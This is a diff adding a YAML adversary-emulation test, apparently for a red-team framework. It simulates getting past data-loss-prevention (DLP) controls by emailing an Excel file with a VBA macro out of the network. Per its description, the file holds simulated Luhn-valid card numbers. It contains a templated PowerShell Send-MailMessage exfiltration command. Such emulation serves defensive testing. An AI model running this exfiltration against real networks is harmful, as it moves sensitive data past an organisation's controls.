@@ -1,0 +1,20 @@
+- description: 'Upon successful execution, an excel containing VBA Macro containing
+    sensitive data will be sent outside the network using email.
+
+    Sensitive data includes about around 20 odd simulated credit card numbers that
+    passes the LUHN check.
+
+    '
+  id: 1827aa5862b0a63ce537ed37636933d5
+  name: DLP Evasion via Sensitive Data in VBA Macro over email
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: 'Send-MailMessage -From #{sender} -To #{receiver} -Subject ''T1027_Atomic_Test''
+          -Attachments "#{input_file}" -SmtpServer #{smtp_server}'
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027
+    name: Obfuscated Files or Information
